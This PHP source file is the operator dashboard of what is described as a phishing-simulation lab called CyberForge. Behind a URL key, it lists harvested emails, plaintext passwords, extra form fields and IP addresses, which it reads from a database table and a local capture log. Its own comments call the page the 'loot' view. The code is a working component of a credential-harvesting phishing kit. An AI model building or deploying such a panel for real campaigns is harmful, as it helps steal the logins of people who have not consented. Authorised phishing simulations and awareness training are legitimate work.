<?php
/**
 * Operator-only view of what the simulation captured (DB + local log file).
 * Protected by a key set in config.php (dash_key). Visit: dashboard.php?key=...
 * This is the "loot" view you show in the CyberForge demo.
 */
require __DIR__ . '/lib.php';
$c   = cfg();
$key = $c['dash_key'] ?? '';
if ($key === '' || (($_GET['key'] ?? '') !== $key)) {
    http_response_code(401);
    echo '<!doctype html><meta charset="utf-8"><body style="font-family:system-ui;background:#0b0f17;color:#e7edf5;padding:48px">'
       . '<h2>401 — Unauthorized</h2><p>Append <code>?key=YOUR_DASH_KEY</code> (set <code>dash_key</code> in config.php).</p></body>';
    exit;
}

$rows = [];
$pdo  = db();
if ($pdo) {
    try { $rows = $pdo->query("SELECT site,kind,email,password,extra,ip,user_agent,referer,created_at
                               FROM captured_credentials ORDER BY id DESC LIMIT 500")->fetchAll(); }
    catch (Throwable $ex) { /* ignore */ }
}
$logf = __DIR__ . '/__captures.log';
if (is_file($logf)) {
    foreach (array_reverse(file($logf, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) as $ln) {
        $j = json_decode($ln, true);
        if (is_array($j)) { $rows[] = $j; }
    }
}
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Captured — <?= e($c['site_name'] ?? 'Simulation') ?></title>
<style>
  *{box-sizing:border-box}body{font-family:system-ui,Arial,sans-serif;background:#0b1018;color:#e7edf5;margin:0;padding:26px 18px 64px}
  h1{font-size:19px;margin:0 0 4px}.sub{color:#8595ad;font-size:12.5px;margin-bottom:18px}
  table{width:100%;border-collapse:collapse;font-size:12.5px;background:#121a2b;border:1px solid #25324a;border-radius:10px;overflow:hidden}
  th,td{padding:9px 11px;text-align:left;border-bottom:1px solid #1d2942;vertical-align:top;word-break:break-word}
  th{background:#16213a;color:#9fb0cc;font-size:10.5px;letter-spacing:.5px;text-transform:uppercase}
  tr:hover td{background:rgba(120,150,200,.05)}
  .pw{font-family:ui-monospace,monospace;color:#ffb3bf}.em{color:#7fd4ff}
  .empty{padding:40px;text-align:center;color:#8595ad}
  code{font-family:ui-monospace,monospace;color:#9fe6c0}
</style>
</head>
<body>
  <h1>Captured submissions &mdash; <?= e($c['site_name'] ?? 'Simulation') ?></h1>
  <div class="sub">Operator view (CyberForge phishing‑simulation lab). <?= count($rows) ?> record(s). Source: MySQL + local log.</div>
  <?php if (!$rows): ?>
    <div class="empty">Nothing captured yet. Submit the form on <code>index.php</code> with test data to see it here.</div>
  <?php else: ?>
  <table>
    <tr><th>When</th><th>Kind</th><th>Email / user</th><th>Password</th><th>Extra</th><th>IP</th></tr>
    <?php foreach ($rows as $r): ?>
      <tr>
        <td><?= e($r['created_at'] ?? '') ?></td>
        <td><?= e($r['kind'] ?? '') ?></td>
        <td class="em"><?= e($r['email'] ?? '') ?></td>
        <td class="pw"><?= e($r['password'] ?? '') ?></td>
        <td><?= e(is_array($r['extra'] ?? '') ? json_encode($r['extra']) : ($r['extra'] ?? '')) ?></td>
        <td><?= e($r['ip'] ?? '') ?></td>
      </tr>
    <?php endforeach; ?>
  </table>
  <?php endif; ?>
</body>
</html>
